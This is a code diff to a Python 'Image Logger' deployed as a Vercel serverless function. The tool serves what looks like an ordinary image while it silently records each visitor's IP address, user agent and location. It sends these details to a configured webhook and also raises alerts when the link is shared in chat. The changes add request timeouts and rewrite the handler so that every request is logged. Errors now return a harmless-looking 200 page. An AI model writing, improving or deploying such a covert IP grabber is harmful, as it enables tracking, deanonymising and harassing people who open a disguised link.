@@ -68,7 +68,7 @@ def reportError(error):
                 "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
             }
         ],
-    })
+    }, timeout=3)
     except:
         pass
 
@@ -90,7 +90,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
                 "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
             }
         ],
-    }) if config["linkAlerts"] else None
+    }, timeout=3) if config["linkAlerts"] else None
         except:
             pass
         return None
@@ -171,7 +171,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     try:
-        requests.post(config["webhook"], json = embed)
+        requests.post(config["webhook"], json = embed, timeout=3)
     except:
         pass
     return info
@@ -320,79 +320,55 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-# Vercel Serverless Function Handler
-async def handler(request):
+handler = ImageLoggerAPI
+
+# Vercel Serverless Handler - FIXED
+async def app(request, response=None):
     """Vercel serverless handler"""
     try:
-        ip = request.headers.get('x-forwarded-for', request.ip)
-        useragent = request.headers.get('user-agent', "Unknown")
+        from urllib.parse import urlparse, parse_qs
         
+        ip = request.headers.get('x-forwarded-for', '0.0.0.0')
+        if ip:
+            ip = ip.split(',')[0].strip()
+        useragent = request.headers.get('user-agent', 'Unknown')
+        
+        # Parse query params
+        parsed = urlparse(request.url)
+        query_params = parse_qs(parsed.query) if parsed.query else {}
+        
+        url = config["image"]
         if config["imageArgument"]:
-            params = request.args
-            if params.get("url"):
+            if query_params.get("url"):
                 try:
-                    url = base64.b64decode(params.get("url").encode()).decode()
+                    url = base64.b64decode(query_params.get("url")[0]).decode()
                 except:
                     url = config["image"]
-            elif params.get("id"):
+            elif query_params.get("id"):
                 try:
-                    url = base64.b64decode(params.get("id").encode()).decode()
+                    url = base64.b64decode(query_params.get("id")[0]).decode()
                 except:
                     url = config["image"]
-            else:
-                url = config["image"]
-        else:
-            url = config["image"]
-
-        data = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''
         
-        if ip and ip.startswith(blacklistedIPs):
-            return {"statusCode": 403}
+        # Log the request
+        makeReport(ip, useragent, endpoint=parsed.path, url=url)
         
-        if botCheck(ip, useragent):
-            makeReport(ip, endpoint="/", url=url)
-            return {
-                "statusCode": 200,
-                "headers": {"Content-Type": "image/jpeg"},
-                "body": binaries.get("loading", b"").decode("latin1")
-            }
-        
-        result = makeReport(ip, useragent, endpoint="/", url=url)
-        
-        message = config["message"]["message"]
-        if config["message"]["richMessage"] and result:
-            message = message.replace("{ip}", ip)
-            message = message.replace("{isp}", result.get("isp", "Unknown"))
-            message = message.replace("{country}", result.get("country", "Unknown"))
-            message = message.replace("{city}", result.get("city", "Unknown"))
-
-        if config["redirect"]["redirect"]:
-            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+        # Return HTML with image
+        html = f'''<html><head><meta charset="UTF-8"></head>
+<body style="margin:0;padding:0;overflow:hidden;">
+<img src="{url}" style="width:100%;height:100%;object-fit:contain;" loading="eager" />
+</body></html>'''
         
         return {
             "statusCode": 200,
-            "headers": {"Content-Type": "text/html"},
-            "body": data
+            "headers": {"Content-Type": "text/html; charset=utf-8"},
+            "body": html
         }
     
     except Exception as e:
         reportError(traceback.format_exc())
         return {
-            "statusCode": 500,
+            "statusCode": 200,
             "headers": {"Content-Type": "text/html"},
-            "body": "500 - Internal Server Error"
+            "body": "<html><body>Image Logger</body></html>"
         }
-
-# Keep both for compatibility
-app = handler
